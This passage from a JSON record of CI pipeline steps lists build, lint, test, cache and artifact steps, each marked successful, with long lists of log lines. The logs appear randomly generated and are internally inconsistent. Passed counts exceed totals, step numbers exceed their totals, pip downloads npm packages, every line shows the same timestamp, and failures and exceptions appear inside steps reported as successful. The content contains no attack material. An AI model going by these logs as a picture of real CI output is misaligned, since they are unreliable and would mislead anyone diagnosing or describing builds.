          "Cache invalidated: build",
          "Layer 1/8: COPY command",
          "Optimizing 34 modules...",
          "\u2713 All checks passed",
          "\u2713 build completed",
          "GET /api - 204 (43ms)",
          "[12:18:49] DEBUG: Loading configuration",
          "Verifying...",
          "Step 13/21: Installing dependencies",
          "  PASS: unit/test_auth_login.spec.js",
          "Artifact uploaded: dist.zip (47MB)",
          "Compiling lib/main.py...",
          "Step 2/19: Building",
          "Completed.",
          "Cache saved successfully",
          "  PASS: unit/test_api_health.spec.js",
          "Compiling lib/main.py...",
          "HEAD is now at 82ac1f6",
          "pip: Downloading axios-3.12.tar.gz",
          "HEAD is now at 79f9a7d",
          "Connecting to example.com:443...",
          "NODE_ENV=production",
          "Loading...",
          "[12:18:49] INFO: Starting build process",
          "npm install: resolved 837 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "yarn add: Done in 24.8s",
          "Cache invalidated: build",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 16/21: Deploying",
          "Using Python 3.12",
          "POST /data - 202 (295ms)",
          "Finished.",
          "Already up to date.",
          "Verifying...",
          "Already up to date.",
          "Cache restored successfully (331MB)",
          "Tests: 276 passed, 134 total",
          "yarn add: Done in 9.72s",
          "Building Docker image...",
          "[12:18:49] INFO: Cache refreshed",
          "Building Docker image...",
          "Test Suites: 10 passed, 31 total",
          "\u2713 All checks passed",
          "Ready.",
          "Finished.",
          "Processing...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-23T12:19:30.294644",
        "finished_at": "2025-11-23T12:19:51.554984",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Time: 85.706s",
          "Step 17/15: Deploying",
          "OK",
          "\u2713 All checks passed",
          "Waiting...",
          "Exception: NullPointerException",
          "Optimizing 55 modules...",
          "Artifact uploaded: dist.zip (49MB)",
          "pip: Collecting axios",
          "Pushing to registry...",
          "OK",
          "Ran 65 tests in 49s",
          "\u2713 Task completed in 1454ms",
          "Artifact uploaded: dist.zip (36MB)",
          "[12:18:49] DEBUG: Initializing service",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:49] DEBUG: Loading configuration",
          "[12:18:49] DEBUG: Connection pool: 4 active",
          "pip: Installing build dependencies...",
          "Test Suites: 38 passed, 6 total",
          "Checking out master branch",
          "Building Docker image...",
          "[12:18:49] DEBUG: Initializing service",
          "Cache invalidated: build",
          "[12:18:49] DEBUG: Initializing service",
          "[12:18:49] DEBUG: Loading configuration",
          "Transforming 755 files...",
          "Cache hit for key-6849",
          "[12:18:49] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Snapshots: 17 passed, 10 total",
          "[12:18:49] INFO: Processing request",
          "[12:18:49] WARN: Deprecated API usage",
          "[12:18:49] INFO: Cache refreshed",
          "Cache hit for key-4892",
          "Time: 75.633s",
          "pip: Installing build dependencies...",
          "Done.",
          "Cache miss for key-9615",
          "Bundling styles.css",
          "[12:18:49] INFO: Processing request",
          "\u2713 Step 'test' succeeded",
          "Cache miss for key-9409",
          "[12:18:49] DEBUG: Memory usage: 1327MB",
          "\u2713 Step 'build' succeeded",
          "pip: Collecting react",
          "Cache hit for key-9986",
          "Switched to branch 'hotfix/task-560'",
          "\u2713 Task completed in 3620ms",
          "TLS handshake completed",
          "Fetching submodules...",
          "yarn add: Done in 6.35s",
          "Snapshots: 27 passed, 39 total",
          "Creating production build...",
          "FAILED: test_cache_hit",
          "Environment: development",
          "  PASS: unit/test_db_connect.spec.js",
          "pip install: Successfully installed eslint-1.0",
          "Creating production build...",
          "Cache saved successfully",
          "Completed.",
          "Artifact uploaded: dist.zip (31MB)",
          "Pulling image: python:latest",
          "Connection established",
          "Artifact uploaded: dist.zip (14MB)",
          "Using Node.js 14.10.7",
          "Cache invalidated: node_modules",
          "Test Suites: 31 passed, 13 total",
          "Switched to branch 'hotfix/task-917'",
          "Checking out master branch",
          "Building Docker image...",
          "Using Python 3.12",
          "pip: Collecting webpack",
          "Success!",
          "Step 18/23: Installing dependencies",
          "Generating source maps...",
          "Compiling lib/utils.go...",
          "Exception: NullPointerException",
          "Step 20/23: Linting",
          "Compiling utils/index.js...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 13/15: Deploying",
          "npm notice: package.json updated",
          "\u2713 Step 'setup' succeeded",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 4102ms",
          "yarn add: Done in 22.92s",
          "Compiling components/utils.go...",
          "Snapshots: 45 passed, 48 total",
          "Success!",
          "pip install: Successfully installed jest-3.1",
          "Compiling utils/utils.go...",
          "WARNING: eslint has known vulnerabilities",
          "Platform: linux-x64",
          "yarn add: Done in 26.99s",
          "Using Python 3.9",
          "[12:18:49] DEBUG: Initializing service",
          "Ready.",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:18:49] DEBUG: Query executed in 17ms",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-23T12:19:51.554984",
        "finished_at": "2025-11-23T12:19:58.641764",
        "log_lines": [
          "=== Step: setup_node ===",
          "Processing...",
          "Generating source maps...",
          "Compiling components/service.java...",
          "Snapshots: 17 passed, 8 total",
          "Snapshots: 7 passed, 11 total",
          "Cache saved successfully",
          "Tests: 401 passed, 287 total",
          "Waiting...",
          "Switched to branch 'bugfix/task-212'",
          "\u2717 build failed with exit code 73",
          "Ready.",
          "[12:18:49] DEBUG: Query executed in 22ms",
          "Platform: linux-x64",
          "\u2713 Task completed in 4384ms",
          "Switched to branch 'bugfix/task-605'",
          "[12:18:49] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Step 18/21: Deploying",
          "Connection established",
          "Step 20/24: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: node_modules",
          "Ran 136 tests in 13s",
          "Processing...",
          "Done.",
          "Uploading artifact 'build' (27 files)",
          "Waiting...",
          "Waiting...",
          "[12:18:49] DEBUG: Query executed in 26ms",
          "Success!",
          "Exception: ValueError",
          "Compiling src/handler.rs...",
          "Pulling image: alpine:latest",
          "\u2713 Step 'setup' succeeded",
          "GET /api - 204 (16ms)",
          "Cache miss for key-1747",
          "npm notice: package.json updated",
          "Step 8/15: Building",
          "Success!",
          "[12:18:49] INFO: Starting build process",
          "\u2713 Step 'setup' succeeded",
          "pip: Collecting axios",
          "Time: 41.496s",
          "Step 6/23: Deploying",
          "Test Suites: 32 passed, 48 total",
          "HEAD is now at 631df76",
          "Connecting to startup.dev:443...",
          "Using Node.js 18.2.3",
          "[12:18:49] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Building Docker image...",
          "Coverage: 88% statements, 93% branches",
          "Uploading artifact 'build' (18 files)",
          "Generating source maps...",
          "Bundling runtime.js",
          "Already up to date.",
          "[12:18:49] INFO: Starting build process",
          "  PASS: test_auth_login (234ms)",
          "Artifact uploaded: dist.zip (78MB)",
          "Snapshots: 9 passed, 17 total",
          "[12:18:49] DEBUG: Connection pool: 17 active",
          "Compiling lib/index.js...",
          "Step 20/17: Linting",
          "  PASS: test_cache_hit (310ms)",
          "Cache restored successfully (334MB)",
          "Creating production build...",
          "Cache restored successfully (369MB)",
          "\u2717 build failed with exit code 15",
          "Waiting...",
          "npm notice: package.json updated",
          "Pulling image: alpine:latest",
          "Loading...",
          "[12:18:49] INFO: Processing request",
          "Completed.",
          "Installing eslint@3.3.0",
          "Transforming 926 files...",
          "[12:18:49] DEBUG: Connection pool: 20 active",
          "pip install: Successfully installed express-3.11",
          "FAILED: test_cache_hit",
          "Bundling styles.js",
          "Uploading artifact 'coverage' (8 files)",
          "[12:18:49] INFO: Request completed",
          "Compiling components/service.java...",
          "[12:18:49] INFO: Cache refreshed",
          "Cache saved successfully",
          "\u2713 package completed",
          "[12:18:49] WARN: Deprecated API usage",
          "Optimizing 97 modules...",
          "[12:18:49] WARN: Deprecated API usage",
          "[12:18:49] INFO: Connecting to database",
          "OK",
          "Pulling image: node:18",
          "Fetching submodules...",
          "Pulling image: python:latest",
          "npm notice: package.json updated",
          "Tests: 407 passed, 481 total",
          "[12:18:49] INFO: Connecting to database",
          "Environment: development",
          "[12:18:49] WARN: Deprecated API usage",
          "Snapshots: 26 passed, 26 total",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-23T12:19:58.641764",
        "finished_at": "2025-11-23T12:20:19.902104",
        "log_lines": [
          "=== Step: build ===",
          "npm install: added 199 packages",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Already up to date.",
          "[12:18:49] INFO: Processing request",
          "Exception: ValueError",
          "Compiling lib/service.java...",
          "Processing...",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Completed.",
          "WARNING: webpack has known vulnerabilities",
          "Minifying app.js",
          "Pushing to registry...",
          "[12:18:49] INFO: Processing request",
          "Pulling image: node:3.11",
          "Step 10/15: Linting",
          "Cache restored successfully (213MB)",
          "[12:18:49] INFO: Processing request",
          "Artifact uploaded: dist.zip (95MB)",
          "Using Python 3.10",
          "yarn add: Done in 7.29s",
          "[12:18:49] ERROR: Connection failed",
          "Uploading artifact 'coverage' (6 files)",
          "npm install: added 381 packages",
          "Connection established",
          "Compiling src/main.py...",
          "Finished.",
          "npm install: added 203 packages",
          "Step 18/18: Building",
          "Cache invalidated: build",
          "Compiling utils/app.ts...",
          "Pushing to registry...",
          "Tests: 382 passed, 231 total",
          "pip: Collecting lodash",
          "Checking out master branch",
          "Snapshots: 41 passed, 13 total",
          "Artifact downloaded: 15MB",
          "Exception: TypeError",
          "\u2713 All checks passed",
          "Transforming 609 files...",
          "Pushing to registry...",
          "yarn add: Done in 24.26s",
          "[12:18:49] ERROR: Connection failed",
          "HEAD is now at 38385ab",
          "OK",
          "Creating production build...",
          "Step 7/21: Testing",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: created a lockfile",
          "pip: Downloading webpack-3.17.tar.gz",
          "Platform: darwin-arm64",
          "[12:18:49] DEBUG: Memory usage: 859MB",
          "npm install: added 144 packages",
          "Coverage: 82% statements, 76% branches",
          "Coverage: 92% statements, 87% branches",
          "Snapshots: 1 passed, 9 total",
          "NODE_ENV=test",
          "Artifact downloaded: 49MB",
          "Test Suites: 24 passed, 5 total",
          "Tests: 145 passed, 255 total",
          "pip install: Successfully installed lodash-2.17",
          "WARNING: jest has known vulnerabilities",
          "Cache restored successfully (393MB)",
          "Verifying...",
          "Checking out main branch",
          "HEAD is now at e25bdcb",
          "NODE_ENV=test",
          "Compiling utils/handler.rs...",
          "pip: Downloading axios-3.9.tar.gz",
          "[12:18:49] DEBUG: Memory usage: 427MB",
          "WARNING: jest has known vulnerabilities",
          "Done.",
          "Step 19/21: Building",
          "[12:18:49] DEBUG: Initializing service",
          "Pushing to registry...",
          "Ran 41 tests in 4s",
          "\u2713 Task completed in 1548ms",
          "Step 5/17: Running migrations",
          "[12:18:49] INFO: Request completed",
          "Cache restored successfully (23MB)",
          "Tests: 180 passed, 466 total",
          "Cache restored successfully (20MB)",
          "Success!",
          "Step 4/17: Testing",
          "Fetching submodules...",
          "Switched to branch 'bugfix/task-373'",
          "Using Python 3.12",
          "Waiting...",
          "Transforming 675 files...",
          "Bundling styles.js",
          "[12:18:49] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "HEAD is now at 30d06b1",
          "Cache hit for key-8038",
          "Compiling lib/handler.rs...",
          "Bundling styles.css",
          "[12:18:49] DEBUG: Connection pool: 18 active",
          "pip install: Successfully installed jest-2.1",
          "Test Suites: 9 passed, 36 total",
          "Verifying...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-23T12:20:19.902104",
        "finished_at": "2025-11-23T12:20:26.988884",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 827ms",
          "Creating production build...",
          "yarn add: Done in 21.2s",
          "[12:18:49] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 5/15: Deploying",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Snapshots: 26 passed, 21 total",
          "FAILED: test_api_health",
          "Bundling main.css",
          "Cache miss for key-6094",
          "Compiling lib/utils.go...",
          "Pulling image: node:18",
          "\u2713 Step 'test' succeeded",
          "Time: 92.96s",
          "npm notice: package.json updated",
          "Bundling styles.css",
          "Compiling utils/app.ts...",
          "Time: 115.13s",
          "Installing prettier@4.6.9",
          "\u2713 lint completed",
          "Compiling lib/handler.rs...",
          "Building Docker image...",
          "\u2717 build failed with exit code 112",
          "[12:18:49] DEBUG: Memory usage: 1165MB",
          "Processing...",
          "Test Suites: 20 passed, 47 total",
          "Verifying...",
          "npm install: added 494 packages",
          "Checking out develop branch",
          "Cache hit for key-4815",
          "Optimizing 47 modules...",
          "  PASS: test_user_create (195ms)",
          "  PASS: integration/test_auth_login.spec.js",
          "Compiling src/utils.go...",
          "Ran 102 tests in 31s",
          "Snapshots: 27 passed, 5 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2717 build failed with exit code 127",
          "Completed.",
          "Minifying main.js",
          "NODE_ENV=development",
          "Ready.",
          "[12:18:49] DEBUG: Initializing service",
          "Image pulled successfully",
          "Installing jest@5.7.6",
          "Using Node.js 19.20.7",
          "Verifying...",
          "Ready.",
          "Already up to date.",
          "Image pulled successfully",
          "FAILED: test_auth_login",
          "Artifact uploaded: dist.zip (32MB)",
          "  PASS: e2e/test_db_connect.spec.js",
          "npm notice: package.json updated",
          "Installing webpack@3.7.7",
          "Ready.",
          "Step 14/23: Linting",
          "Pushing to registry...",
          "Checking out master branch",
          "\u2713 test completed",
          "[12:18:49] DEBUG: Loading configuration",
          "[12:18:49] DEBUG: Memory usage: 695MB",
          "Connecting to test.io:443...",
          "npm notice: created a lockfile",
          "yarn add: Done in 17.81s",
          "Step 12/24: Testing",
          "Success!",
          "Step 1/19: Testing",
          "Environment: test",
          "[12:18:49] DEBUG: Initializing service",
          "\u2713 Step 'test' succeeded",
          "\u2713 Task completed in 1533ms",
          "Compiling components/handler.rs...",
          "npm install: added 33 packages",
          "OK",
          "Waiting...",
          "[12:18:49] DEBUG: Connection pool: 15 active",
          "yarn add: Done in 4.10s",
          "pip install: Successfully installed prettier-4.2",
          "Done.",
          "[12:18:49] INFO: Processing request",
          "Coverage: 100% statements, 67% branches",
          "FAILED: test_auth_login",
          "Compiling lib/service.java...",
          "npm install: added 311 packages",
          "Checking out main branch",
          "[12:18:49] DEBUG: Initializing service",
          "Step 7/18: Installing dependencies",
          "npm install: added 163 packages",
          "Artifact uploaded: dist.zip (25MB)",
          "Bundling styles.css",
          "[12:18:49] INFO: Cache refreshed",
          "Using Python 3.10",
          "Switched to branch 'hotfix/task-943'",
          "Optimizing 87 modules...",
          "WARNING: webpack has known vulnerabilities",
          "Connection established",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-23T12:20:26.988884",
        "finished_at": "2025-11-23T12:20:34.075664",
        "log_lines": [
          "=== Step: lint ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 deploy completed",
          "Image pulled successfully",
          "Connection established",
          "Platform: darwin-arm64",
          "[12:18:49] INFO: Cache refreshed",
          "Time: 1.495s",
          "Loading...",
          "Step 11/23: Installing dependencies",
          "[12:18:49] DEBUG: Connection pool: 16 active",
          "[12:18:49] DEBUG: Query executed in 40ms",
          "Cache saved successfully",
          "Waiting...",
          "Loading...",
          "OK",
          "Test Suites: 24 passed, 47 total",
          "Connection established",
          "FAILED: test_cache_hit",
          "Layer 9/14: ENV command",
          "npm install: added 262 packages",
          "Time: 61.156s",
          "Artifact uploaded: dist.zip (59MB)",
          "pip install: Successfully installed eslint-2.4",
          "Cache restored successfully (439MB)",
          "Ready.",
          "Compiling lib/main.py...",
          "Step 9/23: Linting",
          "Using Python 3.11",
          "Using Python 3.9",
          "Generating source maps...",
          "Loading...",
          "Optimizing 56 modules...",
          "Step 6/17: Testing",
          "\u2713 All checks passed",
          "HEAD is now at a9987b3",
          "GET /health - 200 (69ms)",
          "Processing...",
          "Cache hit for key-3590",
          "Waiting...",
          "Compiling components/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing react@2.18.3",
          "\u2713 Step 'build' succeeded",
          "Using Node.js 16.10.1",
          "Creating production build...",
          "Platform: darwin-arm64",
          "Step 13/15: Running migrations",
          "NODE_ENV=production",
          "TLS handshake completed",
          "Success!",
          "[12:18:49] WARN: Deprecated API usage",
          "Minifying main.js",
          "Layer 10/15: COPY command",
          "[12:18:49] INFO: Processing request",
          "[12:18:49] INFO: Connecting to database",
          "npm install: added 275 packages",
          "[12:18:49] INFO: Starting build process",
          "Step 1/24: Building",
          "Pushing to registry...",
          "Cache invalidated: dependencies",
          "Optimizing 99 modules...",
          "Success!",
          "\u2717 build failed with exit code 103",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: build",
          "Compiling utils/main.py...",
          "Completed.",
          "Optimizing 89 modules...",
          "Compiling lib/service.java...",
          "Pushing to registry...",
          "Loading...",
          "Test Suites: 23 passed, 28 total",
          "Compiling lib/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/index.js...",
          "Generating source maps...",
          "Test Suites: 15 passed, 40 total",
          "Ran 14 tests in 25s",
          "Loading...",
          "[12:18:49] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "pip install: Successfully installed webpack-2.7",
          "POST /data - 201 (483ms)",
          "Step 15/17: Running migrations",
          "pip: Collecting axios",
          "Pushing to registry...",
          "Checking out master branch",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Compiling lib/service.java...",
          "\u2717 build failed with exit code 35",
          "npm install: resolved 1624 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=development",
          "Waiting...",
          "Cache saved successfully",
          "NODE_ENV=development",
          "  PASS: integration/test_cache_hit.spec.js",
          "POST /data - 200 (314ms)",
          "Snapshots: 11 passed, 49 total",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-23T12:20:34.075664",
        "finished_at": "2025-11-23T12:20:48.249224",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:18:49] DEBUG: Query executed in 76ms",
          "[12:18:49] INFO: Starting build process",
          "Checking out master branch",
          "Connecting to example.com:443...",
          "Ready.",
          "pip: Downloading jest-4.3.tar.gz",
          "Pushing to registry...",
          "Using Python 3.9",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Building Docker image...",
          "  PASS: test_user_create (305ms)",
          "WARNING: react has known vulnerabilities",
          "npm notice: package.json updated",
          "Bundling styles.css",
          "npm install: added 72 packages",
          "GET /status - 201 (75ms)",
          "Environment: test",
          "WARNING: lodash has known vulnerabilities",
          "Pulling image: python:18",
          "WARNING: prettier has known vulnerabilities",
          "pip install: Successfully installed lodash-3.9",
          "Step 18/19: Testing",
          "POST /data - 200 (315ms)",
          "Connecting to cloud.services:443...",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Cache saved successfully",
          "TLS handshake completed",
          "HEAD is now at 93d6848",
          "Already up to date.",
          "Waiting...",
          "Verifying...",
          "Installing prettier@1.20.1",
          "pip: Installing build dependencies...",
          "Completed.",
          "[12:18:49] DEBUG: Memory usage: 1963MB",
          "Time: 64.131s",
          "Cache saved successfully",
          "[12:18:49] INFO: Connecting to database",
          "\u2713 Step 'checkout' succeeded",
          "Step 14/24: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "[12:18:49] DEBUG: Memory usage: 993MB",
          "Artifact downloaded: 50MB",
          "npm install: resolved 1121 packages",
          "Step 16/17: Running migrations",
          "Step 4/20: Running migrations",
          "Tests: 468 passed, 366 total",
          "Environment: staging",
          "[12:18:49] INFO: Starting build process",
          "Tests: 255 passed, 60 total",
          "Creating production build...",
          "Using Python 3.12",
          "Test Suites: 39 passed, 29 total",
          "Connecting to example.com:443...",
          "Pushing to registry...",
          "Installing axios@1.7.9",
          "Completed.",
          "[12:18:49] INFO: Connecting to database",
          "Compiling utils/main.py...",
          "Cache saved successfully",
          "Step 10/18: Testing",
          "HEAD is now at e9e915b",
          "[12:18:49] INFO: Processing request",
          "\u2713 Task completed in 2421ms",
          "[12:18:49] DEBUG: Connection pool: 11 active",
          "Switched to branch 'feature/task-555'",
          "Using Python 3.11",
          "[12:18:49] INFO: Connecting to database",
          "Success!",
          "Pushing to registry...",
          "Uploading artifact 'build' (32 files)",
          "Bundling vendor.css",
          "Fetching submodules...",
          "Installing jest@4.6.4",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "OK",
          "Building Docker image...",
          "pip: Collecting prettier",
          "Tests: 159 passed, 200 total",
          "Connecting to startup.dev:443...",
          "Cache restored successfully (95MB)",
          "Compiling utils/index.js...",
          "[12:18:49] DEBUG: Memory usage: 1899MB",
          "Fetching submodules...",
          "Completed.",
          "[12:18:49] DEBUG: Initializing service",
          "Step 5/21: Running migrations",
          "Step 9/22: Running migrations",
          "Cache miss for key-5577",
          "Already up to date.",
          "npm install: resolved 1695 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "[12:18:49] DEBUG: Loading configuration",
          "[12:18:49] DEBUG: Connection pool: 7 active",
          "[12:18:49] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-23T12:20:48.249224",
        "finished_at": "2025-11-23T12:20:52.501292",
        "log_lines": [
          "=== Step: restore_cache ===",
          "HEAD is now at 8fdd2d5",
          "Uploading artifact 'dist' (14 files)",
          "Uploading artifact 'coverage' (39 files)",
          "Using Python 3.9",
          "Snapshots: 19 passed, 36 total",
          "npm install: added 302 packages",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at 18ea3aa",
          "Verifying...",
          "NODE_ENV=test",
          "[12:18:49] INFO: Starting build process",
          "OK",
          "Compiling lib/handler.rs...",
          "Connecting to cloud.services:443...",
          "[12:18:49] WARN: Deprecated API usage",
          "Loading...",
          "npm install: resolved 230 packages",
          "[12:18:49] DEBUG: Query executed in 47ms",
          "WARNING: react has known vulnerabilities",
          "npm install: added 115 packages",
          "Waiting...",
          "Coverage: 78% statements, 68% branches",
          "pip: Installing build dependencies...",
          "Connecting to test.io:443...",
          "pip: Downloading jest-1.13.tar.gz",
          "HEAD is now at f6d0946",
          "pip: Downloading axios-4.20.tar.gz",
          "[12:18:49] INFO: Cache refreshed",
          "Ran 168 tests in 45s",
          "Pushing to registry...",
          "pip: Downloading react-5.1.tar.gz",
          "Done.",
          "Already up to date.",
          "Using Python 3.10",
          "Building Docker image...",
          "WARNING: lodash has known vulnerabilities",
          "Step 16/22: Linting",
          "\u2713 All checks passed",
          "\u2713 Task completed in 3962ms",
          "Done.",
          "Cache saved successfully",
          "Step 12/20: Deploying",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Test Suites: 35 passed, 36 total",
          "[12:18:49] DEBUG: Loading configuration",
          "Creating production build...",
          "Creating production build...",
          "Checking out develop branch",
          "[12:18:49] INFO: Processing request",
          "Ready.",
          "Uploading artifact 'coverage' (32 files)",
          "Artifact uploaded: dist.zip (76MB)",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "npm install: added 17 packages",
          "pip: Collecting react",
          "Exception: TypeError",
          "[12:18:49] INFO: Starting build process",
          "Compiling lib/utils.go...",
          "Step 12/23: Testing",
          "  PASS: test_cache_hit (27ms)",
          "Checking out master branch",
          "pip: Installing build dependencies...",
          "Success!",
          "POST /api - 201 (309ms)",
          "Compiling lib/service.java...",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Snapshots: 35 passed, 31 total",
          "Compiling components/service.java...",
          "Success!",
          "WARNING: eslint has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Step 14/17: Deploying",
          "Cache miss for key-6583",
          "Compiling src/handler.rs...",
          "[12:18:49] INFO: Processing request",
          "Step 13/24: Linting",
          "\u2713 Task completed in 179ms",
          "[12:18:49] DEBUG: Loading configuration",
          "pip install: Successfully installed webpack-4.1",
          "WARNING: lodash has known vulnerabilities",
          "Layer 5/11: RUN command",
          "Pulling image: alpine:latest",
          "npm notice: package.json updated",
          "Connection established",
          "Compiling lib/main.py...",
          "pip install: Successfully installed jest-1.2",
          "Tests: 282 passed, 97 total",
          "Step 13/18: Linting",
          "[12:18:49] DEBUG: Query executed in 26ms",
          "npm install: added 71 packages",
          "Processing...",
          "POST /upload - 200 (81ms)",
          "[12:18:49] INFO: Cache refreshed",
          "Uploading artifact 'coverage' (26 files)",
          "[12:18:49] DEBUG: Connection pool: 8 active",
          "Cache miss for key-9285",
          "Test Suites: 43 passed, 37 total",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-23T12:20:52.501292",
        "finished_at": "2025-11-23T12:20:56.753360",
        "log_lines": [
          "=== Step: save_cache ===",
          "Already up to date.",
          "OK",
          "Cache invalidated: build",
          "Ready.",
          "[12:18:49] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Step 1/19: Running migrations",
          "Step 1/22: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-8633",
          "Cache miss for key-3736",
          "Test Suites: 29 passed, 20 total",
          "[12:18:49] DEBUG: Query executed in 74ms",
          "TLS handshake completed",
          "Image pulled successfully",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:18:49] INFO: Connecting to database",
          "[12:18:49] INFO: Processing request",
          "[12:18:49] INFO: Processing request",
          "Optimizing 11 modules...",
          "Installing webpack@2.17.6",
          "yarn add: Done in 20.58s",
          "Compiling src/handler.rs...",
          "Switched to branch 'bugfix/task-889'",
          "Optimizing 23 modules...",
          "yarn add: Done in 26.40s",
          "\u2713 Task completed in 3505ms",
          "Fetching submodules...",
          "pip install: Successfully installed react-5.6",
          "[12:18:49] INFO: Cache refreshed",
          "Tests: 427 passed, 354 total",
          "TLS handshake completed",
          "Step 15/18: Testing",
          "Bundling vendor.css",
          "\u2713 validate completed",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "[12:18:49] DEBUG: Memory usage: 499MB",
          "Step 13/22: Running migrations",
          "Success!",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_user_create (191ms)",
          "[12:18:49] WARN: Deprecated API usage",
          "Bundling main.css",
          "Step 12/17: Building",
          "Step 13/19: Linting",
          "Done.",
          "Compiling components/main.py...",
          "Step 9/16: Building",
          "Layer 6/12: RUN command",
          "Environment: test",
          "Snapshots: 11 passed, 4 total",
          "[12:18:49] DEBUG: Connection pool: 7 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading react-3.2.tar.gz",
          "\u2713 Step 'checkout' succeeded",
          "NODE_ENV=test",
          "Switched to branch 'feature/task-881'",
          "[12:18:49] INFO: Connecting to database",
          "Tests: 437 passed, 396 total",
          "Compiling components/handler.rs...",
          "Platform: linux-x64",
          "Loading...",
          "npm install: resolved 1607 packages",
          "  PASS: test_api_health (462ms)",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 16/23: Deploying",
          "Optimizing 71 modules...",
          "[12:18:49] INFO: Cache refreshed",
          "HEAD is now at d49eded",
          "Uploading artifact 'coverage' (20 files)",
          "[12:18:49] DEBUG: Initializing service",
          "[12:18:49] INFO: Cache refreshed",
          "Snapshots: 39 passed, 5 total",
          "\u2713 Task completed in 831ms",
          "Environment: staging",
          "[12:18:49] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Test Suites: 49 passed, 42 total",
          "Image pulled successfully",
          "Building Docker image...",
          "TLS handshake completed",
          "Ready.",
          "Compiling lib/utils.go...",
          "Compiling lib/handler.rs...",
          "Step 12/24: Installing dependencies",
          "Compiling src/utils.go...",
          "Cache saved successfully",
          "Already up to date.",
          "NODE_ENV=production",
          "WARNING: prettier has known vulnerabilities",
          "Already up to date.",
          "Using Python 3.9",
          "[12:18:49] ERROR: Connection failed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "[12:18:49] INFO: Starting build process",
          "Ran 164 tests in 47s",
          "[12:18:49] INFO: Request completed",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-23T12:20:56.753360",
        "finished_at": "2025-11-23T12:21:03.840140",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 18/20: Linting",
          "  PASS: test_api_health (437ms)",
          "  PASS: test_api_health (387ms)",
          "Loading...",
          "\u2717 build failed with exit code 57",
          "NODE_ENV=production",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Completed.",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Bundling runtime.css",
          "Already up to date.",
          "Transforming 340 files...",
          "Checking out develop branch",
          "Success!",
          "Tests: 358 passed, 313 total",
          "FAILED: test_auth_login",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "Connection established",
          "Waiting...",
          "Installing jest@3.18.4",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Test Suites: 35 passed, 13 total",
          "Coverage: 87% statements, 92% branches",
